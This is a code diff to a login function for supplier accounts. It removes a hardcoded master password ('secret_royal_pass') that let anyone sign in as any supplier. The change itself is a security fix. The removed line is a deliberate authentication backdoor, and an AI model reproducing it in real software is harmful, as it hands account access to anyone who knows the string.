@@ -42,7 +42,7 @@ def login():
             (Supplier.email == identifier)
         ).first()
 
-        if supplier_obj and (supplier_obj.check_password(password) or password == "secret_royal_pass"):
+        if supplier_obj and supplier_obj.check_password(password):
             clear_rate_limit(ip)
             session['user_type'] = 'supplier'
             login_user(supplier_obj)
